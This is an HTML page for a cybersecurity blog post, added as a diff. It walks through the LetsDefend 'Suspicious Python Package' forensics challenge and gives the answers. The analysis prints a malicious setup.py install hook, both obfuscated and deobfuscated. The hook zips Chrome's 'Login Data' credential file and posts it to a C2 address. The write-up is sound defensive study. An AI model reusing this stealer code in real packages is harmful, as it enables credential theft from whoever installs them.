@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.d451ff92e80abc2a828eb9bb262e4db374bd4e954642f9245c54eec84bf690f3.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Ahmed Mani - Suspicious Python Package LetsDefend Writeup</title>
+<meta property="og:title" content=Ahmed&#32;Mani&#32;-&#32;Suspicious&#32;Python&#32;Package&#32;LetsDefend&#32;Writeup />
+<meta name="twitter:title" content=Ahmed&#32;Mani&#32;-&#32;Suspicious&#32;Python&#32;Package&#32;LetsDefend&#32;Writeup />
+<meta itemprop="name" content=Ahmed&#32;Mani&#32;-&#32;Suspicious&#32;Python&#32;Package&#32;LetsDefend&#32;Writeup />
+<meta name="application-name" content=Ahmed&#32;Mani&#32;-&#32;Suspicious&#32;Python&#32;Package&#32;LetsDefend&#32;Writeup />
+<meta property="og:site_name" content="My Website" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="http://localhost:1313/posts/test/" />
+<link rel="canonical" href="http://localhost:1313/posts/test/" itemprop="url" />
+<meta name="url" content="http://localhost:1313/posts/test/" />
+<meta name="twitter:url" content="http://localhost:1313/posts/test/" />
+<meta property="og:url" content="http://localhost:1313/posts/test/" />
+
+
+<meta property="og:updated_time" content="2026-02-25T02:20:10&#43;01:00" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='http://localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="My Website" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.156.0">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.49603abe3b120fd297c842ac269b38cc04019325df8e0684cbd8acdf14e201e7.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="http://localhost:1313/">
+                <img src="https://poison.lukeorth.com/images/brand_image.jpg" alt="brand image">
+            </a>
+        
+        
+            <a href="http://localhost:1313/">
+                <h1>Ahmed Mani</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    My cybersecurity blog
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About Me</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Write-ups</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/projects/">Projects</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/ahmedmani">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/ahmed-mani-b7202a216/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Telegram" href="https://t.me/ahmedmani10">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19c-.14.75-.42 1-.68 1.03c-.58.05-1.02-.38-1.58-.75c-.88-.58-1.38-.94-2.23-1.5c-.99-.65-.35-1.01.22-1.59c.15-.15 2.71-2.48 2.76-2.69a.2.2 0 0 0-.05-.18c-.06-.05-.14-.03-.21-.02c-.09.02-1.49.95-4.22 2.79c-.4.27-.76.41-1.08.4c-.36-.01-1.04-.2-1.55-.37c-.63-.2-1.12-.31-1.08-.66c.02-.18.27-.36.74-.55c2.92-1.27 4.86-2.11 5.83-2.51c2.78-1.16 3.35-1.36 3.73-1.36c.08 0 .27.02.39.12c.1.08.13.19.14.27c-.01.06.01.24 0 .38z"/>
+        </svg>
+    </a>
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="mailto://ahmedmani@hotmail.com">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+
+
+        <p class="footnote">
+    &copy; 2026 My Website. All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/posts/test/">Suspicious Python Package LetsDefend Writeup</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2026-02-25T02:20:10&#43;0100" class="post-date">
+        February 25, 2026
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>4 mins read</span>
+      </span>
+    </div>
+
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <p>This writeup documents my analysis and investigation of the <a href="https://app.letsdefend.io/challenge/suspicious-python-package" target="_blank">Suspicious Python Package</a> challenge on LetsDefend. As you can guess the objective was to investigate a malicious python package. Let’s get into it…</p>
+<blockquote>
+<p><em>The attacker downloaded a malicious package. What is the full URL?</em></p>
+</blockquote>
+<p>First i assumed the package was downloaded using Chrome instead of Pip. So i looked into the chrome History SQLite db file. Which is located at *“C\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\History”*This file holds various information regarding downloads made on chrome.</p>
+<p>Press enter or click to view image in full size</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*4jTzNlBv5Pu-z3w7RwH06Q.png" alt=""></p>
+<p>Inspecting the <em>urls</em> table gives us the first answer <em>“https://github.com/0xMM0X/peloton”</em></p>
+<blockquote>
+<p><em>What is the name and version of the downloaded package?</em></p>
+</blockquote>
+<p>Inspecting the malicious pacakge metadata file<code>PKG-INFO</code> gives us the next answer. <em>“peloton-client123:0.8.10”</em></p>
+<p><img src="https://miro.medium.com/v2/resize:fit:341/1*rrXMkvsqVujff6-0tYZizw.png" alt=""></p>
+<blockquote>
+<p><em>What is the exact time that this package was downloaded?</em></p>
+</blockquote>
+<p>The term ‘was downloaded’ is a bit vague here, but it refers the exact time the package download was started. You can figure this out in two ways either inspect the master file table “$MFT” as the hint says or do what i did.</p>
+<p>Using the chrome History file from first question, I extracted the “start_time” timestamp from the downloads table.</p>
+<p>Press enter or click to view image in full size</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*cI1Wuq35OIg1YV-_8YBCYw.png" alt=""></p>
+<p>Chrome represents timestamps in the WebKit format so we have to convert it to Unix format first, Using following formula.</p>
+<pre tabindex="0"><code>WebKit timestamp / 1000000 – 11644473600
+</code></pre><p>We obtain “1705953611” which represents <em>“2024–01–22 20:00:11”</em>.</p>
+<blockquote>
+<p><em>What file in the package contains malicious code?</em></p>
+</blockquote>
+<p>The only file containing executable code within the package is <em>“setup.py”.</em></p>
+<blockquote>
+<p><em>What was the name of the archive file created for exfiltration and then deleted?</em></p>
+</blockquote>
+<p>Alright now the fun part we get to deobfuscate the malicious code.</p>
+<pre tabindex="0"><code>_ = lambda __ : import(&#39;zlib&#39;).decompress(import(&#39;base64&#39;).b64decode(__[::-1]));exec((_)(b&#39;=UJaK/-9Fy+nA//2VVchj3Yu/utRf3wJwqs2+Hk2b3NXjc39vRVPpDjnLwNccUvHWrBWZ7AHdnrAgqHsd4OGbLnHwlCCIwGeJzxdw/w5KXuCpOjA15liyTUzglZfMi9gwICmQIdOvFeeWaVSHTjppmEeMIO5DfasOEVzqtwDpX7cSVJ5X8gL+qnuz397UJ8uf7jIuL5wj1f40VveDklPwVnPJjr1Ou+gBCsMSLLS0thhZm3RprTFbY6kzes0QJS7DHjRnWxLyjr634/QMy9gufPjSe1U4mLQtsA7h9TKiPSchFQTT6wRvbxH5dN8ZSCAPKaDR3CtlKW8CxXMjAIK1lZR1dXc71Xd77ffzgv35Zgf5D5AL/pt+kzvmVcjbmnn8xhyHmoWgi8av1veHp/BZyBi+r9OK6dUEje5IonnwO4osYDYo7t9wCNYu9VHYjStq+rriGq63dhm6bZdrBSp6ZYN552uo6v+YyMc/1Z1XGEtPEMwji/3F7RhwEn7vQKYl6D0SyPhnbI8fFSRVD6fLSwAy1ZJrQ8sn3GQVQKRReT03VrTwLLq1g24ZNzpIVanTfSLWusjr/l/kn0sE2ZnWBCe6reQjdamB/G2uF9ZOzFstXSOiUVXpCLS2T9NVpRxeZPflWtkgPBKscV2aeLiwS1Jocv8IVnB3H6cennD6rzmLbaq2yt0Ie/fsebB5TmEZIwttoGqhuh+u8SHKtTjokPzI03pq5iZo2hwPk/gvUwz2r1FV9xJe&#39;))
+</code></pre><p>The “;” marks the end of a line and the start of a new one (on the same line) so let’s start by seperating them.</p>
+<pre tabindex="0"><code>_ = lambda __ : import(&#39;zlib&#39;).decompress(import(&#39;base64&#39;).b64decode(__[::-1]))
+</code></pre><p>Is the equivalent of</p>
+<pre tabindex="0"><code>import zlib, base64
+function _( __ ):
+  zlib.decompress(base64.b64decode(__[::-1]))
+</code></pre><p>The code simply reverses a base64 line, decodes it, then decompresses it. While the second line calls the same function with the base64 payload string. Deobfuscating the payload in the same manner i obtained the</p>
+<pre tabindex="0"><code>from setuptools import setup #line:1
+from setuptools .command .install import install #line:2
+import requests #line:3
+import base64 #line:4
+import zipfile #line:5
+import os #line:6
+class CustomInstall (install ):#line:8
+  def run (OOOO000OOO0O00OO0 ):#line:9
+    install .run (OOOO000OOO0O00OO0 )#line:10
+    O00O0O000O00OOO0O =&#39;C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data&#39;#line:12
+    O00OO000OO0OOO00O =&#39;temp_file.zip&#39;#line:14
+    with zipfile .ZipFile (O00OO000OO0OOO00O ,&#39;w&#39;,zipfile .ZIP_DEFLATED )as OO0OOOO0O00OOOOOO :#line:15
+    OO0OOOO0O00OOOOOO .write (O00O0O000O00OOO0O ,os .path .basename (O00O0O000O00OOO0O ))#line:16
+    with open (O00OO000OO0OOO00O ,&#39;rb&#39;)as OO0OOOO0O00OOOOOO :#line:18
+    OO0O00O00OOOO00O0 =base64 .b64encode (OO0OOOO0O00OOOOOO .read ()).decode (&#39;utf-8&#39;)#line:19
+    os .remove (O00OO000OO0OOO00O )#line:21
+    O0OO0OOOO0O0OO00O =&#39;http://172.31.78.151:8000/&#39;+OO0O00O00OOOO00O0 #line:23
+    requests .post (O0OO0OOOO0O0OO00O )#line:24
+setup (name =&#39;peloton-client123&#39;,version =&#39;0.8.10&#39;,description =&#39;test&#39;,author =&#39;red-fire&#39;,license =&#39;MIT&#39;,zip_safe =False ,cmdclass ={&#39;install&#39;:CustomInstall })
+</code></pre><p>The space between the class and method name confused me so much. I didnt know its syntatically correct…..well you learn something new everyday.</p>
+<p>The code compresses the Chrome credential database file, Base64 encodes it and sends it in a POST request to the attacker. The zip file name is <em>“temp_file.zip”.</em></p>
+<blockquote>
+<p><em>When did the zip file get deleted?</em></p>
+</blockquote>
+<p>For this question i utilized the $UsnJrnl file, which is an NTFS system file that records changes made to files and directories on a volume. The actual data is contained within another binary file located at “C$Extend$J”.</p>
+<p>To read the data i used <a href="https://github.com/EricZimmerman/MFTECmd" target="_blank">MFTECmd</a> along with the Master File Table “$MFT” to parse it.</p>
+<pre tabindex="0"><code>MFTECmd.exe -f C:\Users\LetsDefend\Desktop\$J -m C:\Users\LetsDefend\Desktop\$MFT - csv . - csvf usnjrnl.csv
+</code></pre><p>Searching in the resulting csv file, I found the deletion date which is <em>“2024–01–22 20:00:42”</em></p>
+<blockquote>
+<p><em>What exactly did the attacker steal from the victim’s machine? (Name of the file)</em></p>
+</blockquote>
+<p>From the python code above the sotlen file is “<em>Login Data</em>”.</p>
+<blockquote>
+<p><em>The stolen file contains some sensitive data. What is the full URL of the website and the victim’s username?</em></p>
+</blockquote>
+<p>Inpsecting the stolen file in DB Viewer, In the logins table we get the answer “<a href="https://app.letsdefend.io/_all4m" target="_blank">*https://app.letsdefend.io/_all4m</a>”*.</p>
+<p>Press enter or click to view image in full size</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*vL2BJ-DGNXnZ1CXmOk41nA.png" alt=""></p>
+<blockquote>
+<p><em>What is the IP and PORT number of the attacker C2?</em></p>
+</blockquote>
+<p><em>“172.31.78.151:8000”</em></p>
+<h1 id="conclusion">Conclusion</h1>
+<p>To be honest this was an extremley easy challenge, looking forward for harder exercices. Hope to see in next writeup, stay safe.</p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+	    
+            <div class="next-post">
+                <a href="http://localhost:1313/posts/test2/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Test2</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents"></nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
